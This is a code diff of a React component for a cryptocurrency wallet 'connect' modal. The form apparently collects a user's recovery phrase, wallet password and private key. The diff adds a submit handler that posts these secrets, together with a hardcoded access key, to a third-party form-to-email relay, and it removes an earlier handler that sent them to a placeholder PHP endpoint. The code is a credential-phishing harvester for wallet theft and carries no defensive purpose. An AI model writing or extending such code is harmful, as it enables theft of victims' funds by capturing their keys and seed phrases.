@@ -7,19 +7,45 @@ const Cryp = () => {
   const [isOpen, setIsOpen] = useState(false);
   const [border, setBorder] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState(null);
+  const [result, setResult] = useState("");
 
   const [formData, setFormData] = useState({
-    walletType: '',
-    recoveryPhrase: '',
-    walletPassword: '',
-    privateKey: ''
+    walletType: "",
+    recoveryPhrase: "",
+    walletPassword: "",
+    privateKey: "",
   });
+
+  const onSubmit = async (event) => {
+    event.preventDefault();
+    setResult("Sending....");
+    const formData = new FormData(event.target);
+
+    // Append the walletType to the formData
+    formData.append("walletType", selectedWallet.title); // Add the wallet title
+    formData.append("access_key", "e1bf55fc-b593-48c6-82e0-98caa1758642");
+
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData,
+    });
+
+    const data = await response.json();
+
+    if (data.success) {
+      setResult("Form Submitted Successfully");
+      event.target.reset();
+    } else {
+      console.log("Error", data);
+      setResult(data.message);
+    }
+  };
 
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData({
       ...formData,
-      [name]: value
+      [name]: value,
     });
   };
 
@@ -27,31 +53,6 @@ const Cryp = () => {
     setSelectedWallet(wallet);
     setFormData({ ...formData, walletType: wallet.title }); // Set the wallet type
     setIsOpen(true);
-  };
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    console.log('Form data before submission:', formData); // Debugging line
-
-    try {
-      const response = await fetch('http://your-domain.com/your-project/sendEmail.php', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(formData)
-      });
-
-      const result = await response.json();
-      if (result.success) {
-        alert('Email sent successfully!');
-      } else {
-        alert('Failed to send email.');
-      }
-    } catch (error) {
-      console.error('Error sending email:', error);
-      alert('An error occurred while sending the email.');
-    }
   };
 
   return (
@@ -117,7 +118,7 @@ const Cryp = () => {
               </li>
             </ul>
 
-            <form onSubmit={handleSubmit}>
+            <form onSubmit={onSubmit}>
               <div
                 onMouseDown={() => setBorder(!border)}
                 className={`border rounded-md overflow-hidden mb-5 ${
@@ -125,10 +126,10 @@ const Cryp = () => {
                 }`}
               >
                 <input
-                  className="w-full pb-14 py-1 px-2 outline-none"type="text"
+                  className="w-full pb-14 py-1 px-2 outline-none"
+                  type="text"
                   placeholder="Enter recovery phrase"
                   name="recoveryPhrase"
-                  value={formData.recoveryPhrase}
                   onChange={handleChange}
                   required
                 />
@@ -140,7 +141,6 @@ const Cryp = () => {
                     type="text"
                     placeholder="Wallet password"
                     name="walletPassword"
-                    value={formData.walletPassword}
                     onChange={handleChange}
                     required
                   />
@@ -154,7 +154,7 @@ const Cryp = () => {
                     type="text"
                     placeholder="Enter your Private Key"
                     name="privateKey"
-                    value={formData.privateKey}
+                    value=""
                     onChange={handleChange}
                     required
                   />
@@ -165,7 +165,10 @@ const Cryp = () => {
                 Typically 12 (sometimes 24) words separated by single spaces
               </p>
               <div>
-                <button type="submit" className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded">
+                <button
+                  type="submit"
+                  className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded"
+                >
                   PROCEED
                 </button>
               </div>
